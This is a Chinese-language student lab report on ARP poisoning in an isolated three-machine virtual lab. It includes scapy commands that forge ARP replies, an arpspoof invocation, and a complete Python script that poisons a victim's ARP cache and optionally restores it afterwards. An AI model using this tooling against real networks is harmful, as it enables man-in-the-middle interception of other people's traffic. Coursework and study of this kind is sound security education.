# 网络监听

## 实验目的

- 了解ARP投毒过程
- 熟悉scapy的使用

## 实验要求

- 使用至少三台机器，连接在同一个内部网络中

#### 网络拓扑

![](img/网络拓扑.png)

#### 基本节点信息

| id             | IP Address        | MAC Address       |
| -------------- | ----------------- | ----------------- |
| Gateway-debain | 172.16.111.1/24   | 08:00:27:e2:83:12 |
| kali-attacker  | 172.16.111.109/24 | 08:00:27:33:11:c0 |
| kali-victim    | 172.16.111.121/24 | 08:00:27:a6:1f:86 |

## 实验过程

#### 安装scapy

在攻击者主机中安装scapy（已经提前装好）

![](img/attack-scapy.png)

#### 实验一：检测局域网中的异常中断

```shell
# 在受害者主机上检查网卡的「混杂模式」是否启用
ip link show eth0
```

![](img/victim-eth0.png)

```shell
# 在攻击者主机上开启 scapy
scapy
# 在 scapy 的交互式终端输入以下代码回车执行
pkt = promiscping("172.16.111.121")
```

![](img/attack-promiscping.png)

```shell
# 回到受害者主机上开启网卡的『混杂模式』
# 注意上述输出结果里应该没有出现 PROMISC 字符串
# 手动开启该网卡的「混杂模式」
sudo ip link set eth0 promisc on
# 再次查看，多了promisc选项，开启了混杂模式
ip link show eth0
```

![](img/victim-promisc.png)

```shell
# 回到攻击者主机上的 scapy 交互式终端继续执行命令
# 观察两次命令的输出结果差异
pkt = promiscping("172.16.111.121")
```

![](img/attack-promiscing2.png)

对比两次结果，发现在受害者主机开启混杂模式后，攻击者主机就检测到了受害者混杂模式的开启

```shell
# 在受害者主机上
# 手动关闭该网卡的「混杂模式」
sudo ip link set eth0 promisc off
```

#### 实验二：手工单步“毒化”目标主机的ARP缓存

在攻击者主机上以scapy交互式终端完成“毒化”过程

```python
# 获取当前局域网的网关 MAC 地址
# 构造一个 ARP 请求
arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="172.16.111.1")

# 查看构造好的 ARP 请求报文详情
arpbroadcast.show()
```

![](img/构造ARP请求.png)

```python
# 发送这个 ARP 广播请求
recved = srp(arpbroadcast, timeout=2)

# 网关 MAC 地址如下
gw_mac = recved[0][0][1].hwsrc
```

![](img/获取网关mac地址.png)

```python
# 伪造网关的 ARP 响应包
# 准备发送给受害者主机 172.16.111.121
# ARP的源IP改为网关的IP地址
# ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
arpspoofed=Ether()/ARP(op=2, psrc="172.16.111.1", pdst="172.16.111.121", hwdst="08:00:27:33:11:c0")

# 发送上述伪造的 ARP 响应数据包到受害者主机
sendp(arpspoofed)
```

查看受害者主机的ARP缓存

![](img/victim-ARP.png)

发现网关的MAC地址已经被替换为攻击者主机的MAC地址，说明毒害受害者ARP缓存成功

```python
# 恢复受害者主机的 ARP 缓存记录
## 伪装网关给受害者发送 ARP 响应
restorepkt1 = Ether()/ARP(op=2, psrc="172.16.111.1", hwsrc="08:00:27:e2:83:12", pdst="172.16.111.121", hwdst="08:00:27:a6:1f:86")
sendp(restorepkt1, count=100, inter=0.2)
## 伪装受害者给网关发送 ARP 响应
restorepkt2 = Ether()/ARP(op=2, pdst="172.16.111.1", hwdst="08:00:27:e2:83:12", psrc="172.16.111.121", hwsrc="08:00:27:a6:1f:86")
sendp(restorepkt2, count=100, inter=0.2)
```

查看受害者主机的ARP缓存，已经成功恢复

![](img/restore-arp.png)

#### 实验三：使用自动化工具完成ARP投毒劫持实验

在kali中有arpspoof工具用于完成ARP投毒劫持

```shell
sudo arpspoof -i eth0 -t 172.16.111.121<想要劫持的目标主机> 172.16.111.1<想要伪装成的主机ip>
```

![](img/tools-arp.png)

可以看到直接完成了ARP的投毒劫持实验，按Ctrl+C终止劫持，此攻击会自动完成恢复目标主机的ARP缓存过程。

![](img/restore.png)

#### 实验四：基于scapy编写ARP投毒劫持工具

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
from scapy.all import ARP, Ether, get_if_hwaddr, sendp,srp
from scapy.layers.l2 import getmacbyip

def get_mac(target_ip):
	'''
	use getmacbyip function to get target Ip's MAC address
	'''
	target_mac = getmacbyip(target_ip)
	if target_mac is not None:
		return target_mac
	else:
		print("无法获取IP为：%s 主机的MAC地址，请检查目标IP是否存活"%target_ip)
		
def create_arp_target(src_ip,src_mac,target_ip,target_mac):
	'''
    生成ARP数据包，伪造网关欺骗目标计算机
    src_mac:本机的MAC地址，充当中间人
    target_mac:目标计算机的MAC
    src_ip:要伪装的IP，将发往网关的数据指向本机（中间人），形成ARP攻击
    target_ip:目标计算机的IP
    op=is-at,表示ARP响应
	'''
	pkt = Ether()/ARP(op=2,psrc=src_ip,hwsrc=src_mac,pdst=target_ip,hwdst=target_mac)
	return pkt
	
def create_arp_gateway(gateway_ip):

	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=gateway_ip)
	return pkt
	
def main():
	src_ip = "172.16.111.109"
	interface="eth0"
	src_mac = get_if_hwaddr(interface)
	print('本机IP地址是：', src_ip)
	print('本机MAC地址是:',src_mac)
	target_ip="172.16.111.121"
	target_mac=get_mac(target_ip)
	print("目标计算机IP地址是：", target_ip)
	print("目标计算机MAC地址是：", target_mac)
	gateway_ip = "172.16.111.1"
	arpbroadcast = create_arp_gateway(gateway_ip)
	# 发送这个 ARP 广播请求
	recved = srp(arpbroadcast, timeout=2)
	# 网关 MAC 地址如下
	gateway_mac = recved[0][0][1].hwsrc
	print("网关MAC地址是：", gateway_mac)
	arpspoofed = create_arp_target(gateway_ip,src_mac,target_ip,src_mac)
	sendp(arpspoofed)
	choice = input("是否恢复受害者主机ARP缓存(y/n):")
	if choice == 'y':
		restorepkt1=create_arp_target(gateway_ip,gateway_mac,target_ip,target_mac)
		sendp(restorepkt1,count=10,inter=0.1)
		restorepkt2=create_arp_target(target_ip,target_mac,gateway_ip,gateway_mac)
		sendp(restorepkt2,count=10,inter=0.1)
		
	
if __name__=='__main__':
	main()
```

![](img/auto-arp.png)

![](img/auto-restore-arp.png)



## 参考资料

- [课本第四章实验](https://c4pr1c3.github.io/cuc-ns/chap0x04/exp.html)
- [ARP欺骗工具arpspoof的用法](https://blog.werner.wiki/usage-of-arpspoof/)
- [Python scapy实现一个简易arp攻击脚本](https://www.jianshu.com/p/df5918069612)

